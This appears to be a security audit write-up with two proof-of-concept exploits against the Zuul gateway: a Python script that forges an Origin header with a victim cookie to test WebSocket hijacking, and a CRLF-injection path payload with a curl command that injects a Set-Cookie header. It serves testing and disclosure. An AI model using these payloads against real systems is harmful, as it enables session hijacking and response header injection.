# Phase 15 — Proof of Concept Development

## PoC 1: Push Messaging CSRF Bypass

### Description
This PoC demonstrates how an attacker can bypass the `Origin` header validation in `PushAuthHandler` to perform a Cross-Origin WebSocket Hijacking attack.

### Reproduction Steps
1.  Start the Zuul sample server in WEBSOCKET or SSE mode (port 7008 for push).
2.  Run the Python PoC script.

### Exploit Payload
Malicious `Origin` header: `http://attacker.sample.netflix.com`

### Exploit Script (`pocs/zuul/push_csrf_poc.py`)
```python
import requests

zuul_push_url = "http://localhost:7008/push"
attacker_domain = "attacker.sample.netflix.com"

headers = {
    "Origin": f"http://{attacker_domain}",
    "Upgrade": "websocket",
    "Connection": "Upgrade",
    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
    "Sec-WebSocket-Version": "13",
    "Cookie": "userAuthCookie=victim_user_123"
}

response = requests.get(zuul_push_url, headers=headers)
if response.status_code != 400:
    print(f"SUCCESS: Origin '{attacker_domain}' accepted!")
```

## PoC 2: CRLF Injection (Conceptual)

### Description
Demonstrates how unsanitized input can lead to header injection via `X-Originating-URL`.

### Reproduction Steps
1.  Send a request to Zuul with CRLF in the path: `/test%0D%0ASet-Cookie:%20malicious=true`.
2.  Zuul processes the request and reaches `ZuulResponseFilter`.
3.  The filter sets `X-Originating-URL` using `reconstructURI()`.
4.  If the path isn't sanitized, the outbound response will contain an injected header.

### Exploit Payload
Path: `/test%0D%0ASet-Cookie:%20malicious=true`

### Curl Command
```bash
curl -v "http://localhost:7001/test%0D%0ASet-Cookie:%20malicious=true"
```
Check for `malicious=true` cookie in the response.
